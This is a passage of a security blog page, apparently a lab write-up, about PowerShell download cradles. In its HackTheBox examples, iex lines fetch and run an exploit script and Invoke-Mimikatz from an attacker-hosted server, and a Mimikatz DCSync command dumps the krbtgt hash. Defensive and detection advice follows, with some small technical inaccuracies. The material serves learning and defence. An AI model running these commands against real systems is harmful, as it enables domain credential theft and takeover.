+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Basic usage</span>
+</span></span><span style="display:flex;"><span>Invoke-SecureDownloadCradle -Url <span style="color:#e6db74">&#34;https://internal.repo/scripts/diagnostic.ps1&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># With custom User-Agent and timeout</span>
+</span></span><span style="display:flex;"><span>Invoke-SecureDownloadCradle -Url <span style="color:#e6db74">&#34;https://internal.repo/scripts/update.ps1&#34;</span> `
+</span></span><span style="display:flex;"><span>    -UserAgent <span style="color:#e6db74">&#34;CompanyName/UpdateService&#34;</span> `
+</span></span><span style="display:flex;"><span>    -Timeout <span style="color:#ae81ff">60000</span></span></span></code></pre></div>
+    
+</div>
+<h2 id="real-world-examples-from-hackthebox">Real-World Examples from HackTheBox</h2>
+<h3 id="monteverde-machine-running-remote-exploits">Monteverde Machine: Running Remote Exploits</h3>
+<p>In this example, we used a download cradle to execute AdConnect exploitation directly in memory:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>iex(new-object net.webclient).downloadstring(<span style="color:#e6db74">&#39;http://10.10.14.46:9000/AdConnectPOC.ps1&#39;</span>)</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-14-131101_.png">
+</figure>
+</li>
+<li>As the exploit is run in memory we get the administrators password without writing to disk.</li>
+</ul>
+<h3 id="certified-box-advanced-mimikatz-usage">Certified Box: Advanced Mimikatz Usage</h3>
+<ul>
+<li>Note this is not a spoiler as this is done post exploitation.</li>
+</ul>
+<h4 id="setting-up-the-environment">Setting Up the Environment</h4>
+<ol>
+<li>Start a Python HTTP server to host the Mimikatz script:
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%20%20%20python3%20-m%20http.server%209000">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>   python3 -m http.server <span style="color:#ae81ff">9000</span></span></span></code></pre></div>
+    
+</div>
+</li>
+</ol>
+<h4 id="loading-mimikatz-into-memory">Loading Mimikatz into Memory</h4>
+<p>Using a download cradle to load <a href="https://github.com/g4uss47/Invoke-Mimikatz">invoke-mimikatz</a> directly into memory:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>iex(new-object net.webclient).downloadstring(<span style="color:#e6db74">&#39;http://10.10.14.24:9000/Invoke-Mimikatz.ps1&#39;</span>)</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-10-134628_.png">
+</figure>
+</li>
+<li>+Note+: This will hang for a little bit, so just be patient.</li>
+</ul>
+<h4 id="performing-dc-sync-attack">Performing DC-Sync Attack</h4>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Invoke-Mimikatz -Command <span style="color:#e6db74">&#39;&#34;privilege::debug&#34; &#34;lsadump::dcsync /user:krbtgt /domain:administrator.htb&#34;&#39;</span></span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-10-135022_.png">
+</figure>
+</li>
+</ul>
+<h2 id="security-considerations">Security Considerations</h2>
+<h3 id="detection-methods">Detection Methods</h3>
+<p>Modern security solutions detect download cradles through several means:</p>
+<ul>
+<li>PowerShell logging and ScriptBlock logging</li>
+<li>Network traffic analysis (especially <code>.DownloadString</code> patterns)</li>
+<li>AMSI integration in PowerShell 5.0+</li>
+<li>EDR behavioral analysis</li>
+<li>Memory scanning for known patterns</li>
+</ul>
+<h3 id="common-restrictions">Common Restrictions</h3>
+<p>Organizations often implement:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#%20Execution%20Policy%0aSet-ExecutionPolicy%20Restricted%0a%0a#%20AMSI%20Scanning%0a#%20Built%20into%20PowerShell%205.0&#43;%20by%20default%0a%0a#%20AppLocker%20Rules%0a#%20Block%20PowerShell%20download%20cradle%20patterns%0aNew-AppLockerPolicy%20-RuleType%20Path%20-Deny%20-Path%20%22%25SYSTEM32%25%5cWindowsPowerShell%5c*%5cpowershell.exe%22%20-User%20Everyone">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Execution Policy</span>
+</span></span><span style="display:flex;"><span>Set-ExecutionPolicy Restricted
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># AMSI Scanning</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Built into PowerShell 5.0+ by default</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># AppLocker Rules</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Block PowerShell download cradle patterns</span>
+</span></span><span style="display:flex;"><span>New-AppLockerPolicy -RuleType Path -Deny -Path <span style="color:#e6db74">&#34;%SYSTEM32%\WindowsPowerShell\*\powershell.exe&#34;</span> -User Everyone</span></span></code></pre></div>
+    
+</div>
+<h3 id="defensive-recommendations">Defensive Recommendations</h3>
+<p><strong>For system administrators</strong>:</p>
+<ol>
+<li>
+<p><strong>Enable PowerShell logging</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>   <span style="color:#75715e"># Enable detailed script block logging</span>
+</span></span><span style="display:flex;"><span>   Set-ItemProperty -Path <span style="color:#e6db74">&#34;HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging&#34;</span> -Name <span style="color:#e6db74">&#34;EnableScriptBlockLogging&#34;</span> -Value <span style="color:#ae81ff">1</span></span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p><strong>Monitor for suspicious patterns</strong>:</p>
+<ul>
+<li>Direct execution using <code>IEX</code></li>
+<li>Base64 encoded commands</li>
+<li>Uncommon COM objects</li>
+<li>Unusual DNS TXT queries</li>
+</ul>
+</li>
+<li>
+<p><strong>Network Controls</strong>:</p>
+<ul>
+<li>Implement HTTPS inspection</li>
+<li>Block outbound PowerShell connections</li>
+<li>Monitor for unusual PowerShell network activity</li>
+</ul>
+</li>
+</ol>
+<h3 id="legitimate-use-cases">Legitimate Use Cases</h3>
+<ul>
+<li>Download cradles aren&rsquo;t just for security testing - they&rsquo;re valuable tools for system administrators and developers in enterprise environments. Here are some common legitimate scenarios:</li>
+</ul>
+<h4 id="configuration-management">Configuration Management</h4>
+<p>Configuration management requires frequent updates across multiple systems. Using download cradles ensures all systems stay in sync with the central repository.</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Example: Downloading and applying configuration from internal repository</span>
+</span></span><span style="display:flex;"><span>$config = Invoke-WebRequest -Uri <span style="color:#e6db74">&#34;https://internal.repo/configs/web-server.json&#34;</span>
+</span></span><span style="display:flex;"><span>Set-ServerConfiguration -InputObject ($config.Content | ConvertFrom-Json)</span></span></code></pre></div>
+    
+</div>
+<h4 id="automated-patching">Automated Patching</h4>
+<p>Automated patch management is crucial for maintaining system security. This example shows how to safely download and track patch installations.</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Example: Downloading and applying patches from approved source</span>
+</span></span><span style="display:flex;"><span>$patches = Get-PatchList -Environment <span style="color:#e6db74">&#34;Production&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">foreach</span> ($patch <span style="color:#66d9ef">in</span> $patches) {
+</span></span><span style="display:flex;"><span>    Start-BitsTransfer -Source $patch.Uri -Destination <span style="color:#e6db74">&#34;C:\Updates&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Implement verification and logging</span>
+</span></span><span style="display:flex;"><span>    Write-Log <span style="color:#e6db74">&#34;Downloaded patch: </span>$($patch.Name)<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
+    
+</div>
+<h4 id="remote-diagnostics">Remote Diagnostics</h4>
+<p>When troubleshooting remote systems, being able to run diagnostic scripts directly from a central repository saves time and ensures consistency.</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Example: Running diagnostic scripts from central repository</span>
+</span></span><span style="display:flex;"><span>$diagnostic = Invoke-WebRequest -Uri <span style="color:#e6db74">&#34;https://tools.internal/diagnostics/memory-check.ps1&#34;</span> `
+</span></span><span style="display:flex;"><span>    -Headers @{<span style="color:#e6db74">&#34;Authorization&#34;</span> = <span style="color:#e6db74">&#34;Bearer </span>$token<span style="color:#e6db74">&#34;</span>} `
+</span></span><span style="display:flex;"><span>    -UseDefaultCredentials
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (Test-ScriptSignature $diagnostic.Content) {
+</span></span><span style="display:flex;"><span>    Invoke-Expression $diagnostic.Content
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
+    
+</div>
+<h2 id="best-practices">Best Practices</h2>
+<p>Implementing download cradles securely requires attention to several key areas. Here&rsquo;s a comprehensive guide to best practices:</p>
+<h3 id="code-implementation">Code Implementation</h3>
+<h4 id="error-handling">Error Handling</h4>
+<p>Robust error handling is crucial for production environments. This example shows how to handle common failure scenarios while maintaining security.</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="try%20%7b%0a%20%20%20%20$webClient%20=%20New-Object%20System.Net.WebClient%0a%20%20%20%20$webClient.Headers.Add%28%22User-Agent%22,%20%22Corporate-Updater/1.0%22%29%0a%20%20%20%20$webClient.Proxy%20=%20[System.Net.WebRequest]::GetSystemWebProxy%28%29%0a%20%20%20%20$webClient.Proxy.Credentials%20=%20[System.Net.CredentialCache]::DefaultNetworkCredentials%0a%0a%20%20%20%20#%20Implement%20timeout%0a%20%20%20%20$webClient.Timeout%20=%2030000%20#%2030%20seconds%0a%0a%20%20%20%20#%20Download%20with%20certificate%20validation%0a%20%20%20%20[System.Net.ServicePointManager]::SecurityProtocol%20=%20[System.Net.SecurityProtocolType]::Tls12%0a%20%20%20%20$script%20=%20$webClient.DownloadString%28$url%29%0a%0a%20%20%20%20#%20Verify%20signature%20before%20execution%0a%20%20%20%20if%20%28Test-ScriptSignature%20$script%29%20%7b%0a%20%20%20%20%20%20%20%20Invoke-Expression%20$script%0a%20%20%20%20%7d%0a%7d%20catch%20[System.Net.WebException]%20%7b%0a%20%20%20%20Write-Error%20%22Network%20error:%20$%28$_.Exception.Message%29%22%0a%7d%20catch%20%7b%0a%20%20%20%20Write-Error%20%22Unexpected%20error:%20$_%22%0a%7d%20finally%20%7b%0a%20%20%20%20$webClient.Dispose%28%29%0a%7d">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>    $webClient = New-Object System.Net.WebClient
+</span></span><span style="display:flex;"><span>    $webClient.Headers.Add(<span style="color:#e6db74">&#34;User-Agent&#34;</span>, <span style="color:#e6db74">&#34;Corporate-Updater/1.0&#34;</span>)
+</span></span><span style="display:flex;"><span>    $webClient.Proxy = [<span style="color:#66d9ef">System.Net.WebRequest</span>]::GetSystemWebProxy()
+</span></span><span style="display:flex;"><span>    $webClient.Proxy.Credentials = [<span style="color:#66d9ef">System.Net.CredentialCache</span>]::DefaultNetworkCredentials
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Implement timeout</span>
+</span></span><span style="display:flex;"><span>    $webClient.Timeout = <span style="color:#ae81ff">30000</span> <span style="color:#75715e"># 30 seconds</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Download with certificate validation</span>
+</span></span><span style="display:flex;"><span>    [<span style="color:#66d9ef">System.Net.ServicePointManager</span>]::SecurityProtocol = [<span style="color:#66d9ef">System.Net.SecurityProtocolType</span>]::Tls12
+</span></span><span style="display:flex;"><span>    $script = $webClient.DownloadString($url)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Verify signature before execution</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (Test-ScriptSignature $script) {
+</span></span><span style="display:flex;"><span>        Invoke-Expression $script
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">catch</span> [<span style="color:#66d9ef">System.Net.WebException</span>] {
+</span></span><span style="display:flex;"><span>    Write-Error <span style="color:#e6db74">&#34;Network error: </span>$($_.Exception.Message)<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">catch</span> {
+</span></span><span style="display:flex;"><span>    Write-Error <span style="color:#e6db74">&#34;Unexpected error: </span>$_<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">finally</span> {
+</span></span><span style="display:flex;"><span>    $webClient.Dispose()
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
+    
+</div>
+<h4 id="logging-and-monitoring">Logging and Monitoring</h4>
+<p>Proper logging is essential for troubleshooting and audit trails. This implementation provides detailed logging of all download operations.</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> Start-ScriptDownload {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">param</span>($Uri)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    $EventParams = @{
+</span></span><span style="display:flex;"><span>        LogName = <span style="color:#e6db74">&#39;Application&#39;</span>
+</span></span><span style="display:flex;"><span>        Source = <span style="color:#e6db74">&#39;ScriptDownloader&#39;</span>
+</span></span><span style="display:flex;"><span>        EventId = <span style="color:#ae81ff">1000</span>
+</span></span><span style="display:flex;"><span>        EntryType = <span style="color:#e6db74">&#39;Information&#39;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Write-EventLog @EventParams -Message <span style="color:#e6db74">&#34;Starting download from: </span>$Uri<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Implement download logic</span>
+</span></span><span style="display:flex;"><span>    Write-EventLog @EventParams -Message <span style="color:#e6db74">&#34;Download completed: </span>$Uri<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
+    
+</div>
+<h3 id="security-measures">Security Measures</h3>
+<h4 id="certificate-validation">Certificate Validation</h4>
+<p>Always validate certificates to prevent man-in-the-middle attacks. These settings ensure proper TLS configuration.</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Ensure proper certificate validation</span>
+</span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">System.Net.ServicePointManager</span>]::ServerCertificateValidationCallback = $null
+</span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">System.Net.ServicePointManager</span>]::SecurityProtocol = [<span style="color:#66d9ef">System.Net.SecurityProtocolType</span>]::Tls12</span></span></code></pre></div>
+    
+</div>
+<h4 id="hash-verification">Hash Verification</h4>
+<p>Verify file integrity using hash checks. This function provides a reusable way to validate downloaded content.</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="function%20Test-FileHash%20%7b%0a%20%20%20%20param%28%0a%20%20%20%20%20%20%20%20[string]$FilePath,%0a%20%20%20%20%20%20%20%20[string]$ExpectedHash%0a%20%20%20%20%29%0a%0a%20%20%20%20$actualHash%20=%20Get-FileHash%20-Path%20$FilePath%20-Algorithm%20SHA256%0a%20%20%20%20return%20$actualHash.Hash%20-eq%20$ExpectedHash%0a%7d">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> Test-FileHash {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">param</span>(
+</span></span><span style="display:flex;"><span>        [<span style="color:#66d9ef">string</span>]$FilePath,
+</span></span><span style="display:flex;"><span>        [<span style="color:#66d9ef">string</span>]$ExpectedHash
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    $actualHash = Get-FileHash -Path $FilePath -Algorithm SHA256
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> $actualHash.Hash <span style="color:#f92672">-eq</span> $ExpectedHash
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
+    
+</div>
+<h3 id="operational-guidelines">Operational Guidelines</h3>
+<p>Following these guidelines ensures your download cradles remain secure and maintainable over time:</p>
+<ol>
+<li>
+<p><strong>Source Control</strong></p>
+<ul>
+<li>Maintain scripts in version control</li>
+<li>Use approved internal repositories</li>
+<li>Implement change management procedures</li>
+</ul>
+</li>
+<li>
+<p><strong>Documentation</strong></p>
+<ul>
+<li>Document all implemented download cradles</li>
+<li>Maintain usage logs</li>
+<li>Keep deployment documentation updated</li>
+</ul>
+</li>
+<li>
+<p><strong>Testing</strong></p>
+<ul>
+<li>Test in development environment first</li>
+<li>Verify behavior with security tools enabled</li>
+<li>Validate against current security policies</li>
+</ul>
+</li>
+<li>
+<p><strong>Maintenance</strong></p>
+<ul>
+<li>Regular review of implemented cradles</li>
+<li>Update security certificates</li>
+<li>Monitor for deprecated methods</li>
+</ul>
+</li>
+</ol>
+
+            
+        </div>
+    </article>
+
+        </main>
+
+        <footer class="footer">
+    <div class="footer-left">
+        <ul class="social">
+            
+                <li>All Rights Reserved ®.</li>
+            
+
+            
+                <li>Bloodstiller</li>
+            
+
+            
+                
+            
+                
+            
+                
+                    <li>
+                        
+                            <a href="https://github.com/bloodstiller" target="_blank">
+                                <i class="bi-github"></i>
+                            </a>
+                        
+
+                    </li>
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+        </ul>
+    </div>
+
+    <div class="footer-right">
+        <ul class="control status clearfix">
+            
+                <li>
+                    
+                        Word Count:
+                        1112
+                    
+                </li>
+            
+
+
+            
+                <li>en</li>
+            
+
+            
+
+            
+
+            
+                <li>
+                    
+                        Last modified: &nbsp;
+                        <time>
+                            Nov 11 2024 00:00:00
+                        </time>
+                    
+                </li>
+            
+
+            
+        </ul>
+    </div>
+</footer>
+
+    </body>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/codeblock_copy.c59588ba3a219dafab515508b0bcd2d0592dc9e0e08de20dc1983bfd8cb69d03d37c78eadd81ee7bef724570f9e4286d9ea1c53ca59d3711c0bcad9e9134d0e9.js"
+            integrity="sha512-xZWIujohna&#43;rUVUIsLzS0FktyeDgjeINwZg7/Yy2nQPTfHjq3YHue&#43;9yRXD55ChtnqHFPKWdNxHAvK2ekTTQ6Q=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/custom.e55ae031ca7d8c1e9bde9a72058dd382e3de5ff9b7df41d6d0e4ccb82ff9962e74b4865412dc15db16e5f16012d5cf9e2330b9826a3a36d5a272077f70e1341b.js"
+            integrity="sha512-5VrgMcp9jB6b3ppyBY3TguPeX/m330HW0OTMuC/5li50tIZUEtwV2xbl8WAS1c&#43;eIzC5gmo6NtWicgd/cOE0Gw=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/dir_toggle.e6f8c63f3ed9aefa9cedb3be3d5ab67e00bc3cf87a8dd7ef1ed55d642e9a7d80837636a26ae77f967f2aa74a44ae70c4134e25abca587f048c60807ba9e9c82f.js"
+            integrity="sha512-5vjGPz7Zrvqc7bO&#43;PVq2fgC8PPh6jdfvHtVdZC6afYCDdjaiaud/ln8qp0pErnDEE04lq8pYfwSMYIB7qenILw=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/sidebar.01b59c615736643387108a100de70c51d5e98477bdc338244a87d37f7e38286b48683459eade68087f0688f0235e7a48691e633954fa930d41823e9ddf797085.js"
+            integrity="sha512-AbWcYVc2ZDOHEIoQDecMUdXphHe9wzgkSofTf344KGtIaDRZ6t5oCH8GiPAjXnpIaR5jOVT6kw1Bgj6d33lwhQ=="></script>
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link
+    rel="stylesheet"
+    href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" />
+
+
+
+
+</html>
